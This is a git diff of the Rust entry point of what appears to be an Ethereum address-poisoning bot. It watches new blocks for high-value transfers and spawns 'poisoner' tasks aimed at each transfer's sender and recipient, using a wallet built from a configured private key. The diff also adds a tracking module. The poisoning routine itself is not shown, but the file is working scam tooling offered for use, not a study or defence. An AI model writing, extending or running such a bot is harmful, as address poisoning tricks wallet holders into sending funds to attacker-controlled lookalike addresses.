@@ -1,6 +1,7 @@
 use crate::config::get_config;
-use crate::poison::poison;
+use crate::poisoner::poisoner;
 use crate::providers::{get_http_provider, get_ws_provider};
+use crate::tracker::tracker;
 use crate::utils::setup_logger;
 use alloy::consensus::Transaction;
 use alloy::network::{EthereumWallet, TransactionResponse};
@@ -15,8 +16,9 @@ use std::str::FromStr;
 use std::sync::Arc;
 
 mod config;
-mod poison;
+mod poisoner;
 mod providers;
+mod tracker;
 mod utils;
 
 #[tokio::main]
@@ -24,17 +26,17 @@ async fn main() {
     setup_logger();
 
     let config = Arc::new(get_config());
+    let db = Arc::new(DB::open_default("db").unwrap());
+
     let target_value = U256::from(config.target.value);
     let target_value = target_value.mul(U256::from(10).pow(U256::from(18)));
 
-    let db = Arc::new(DB::open_default("db").unwrap());
-    let ws_provider = get_ws_provider(&config.ws_url).await;
+    let signer = PrivateKeySigner::from_str(&config.private_key).unwrap();
+    let wallet = EthereumWallet::from(signer);
+    let provider = Arc::new(get_http_provider(wallet, &config.http_url));
 
-    let private_key_signer = PrivateKeySigner::from_str(&config.private_key).unwrap();
-    let ethereum_wallet = EthereumWallet::from(private_key_signer);
-    let http_provider = Arc::new(get_http_provider(ethereum_wallet, &config.http_url));
-
-    let mut stream = ws_provider
+    let mut stream = get_ws_provider(&config.ws_url)
+        .await
         .subscribe_full_blocks()
         .full()
         .into_stream()
@@ -46,24 +48,26 @@ async fn main() {
         debug!("block received | number {}", block.number());
 
         for transaction in block.into_transactions_iter() {
+            tracker(&config, &db, &transaction);
+
             if transaction.value() > target_value {
                 debug!("matching transaction | hash {}", transaction.tx_hash());
 
                 if config.target.from {
-                    tokio::spawn(poison(
+                    tokio::spawn(poisoner(
                         Arc::clone(&config),
                         Arc::clone(&db),
-                        Arc::clone(&http_provider),
+                        Arc::clone(&provider),
                         transaction.to().unwrap(),
                         transaction.from(),
                     ));
                 }
 
                 if config.target.to && transaction.to().is_some() {
-                    tokio::spawn(poison(
+                    tokio::spawn(poisoner(
                         Arc::clone(&config),
                         Arc::clone(&db),
-                        Arc::clone(&http_provider),
+                        Arc::clone(&provider),
                         transaction.from(),
                         transaction.to().unwrap(),
                     ));
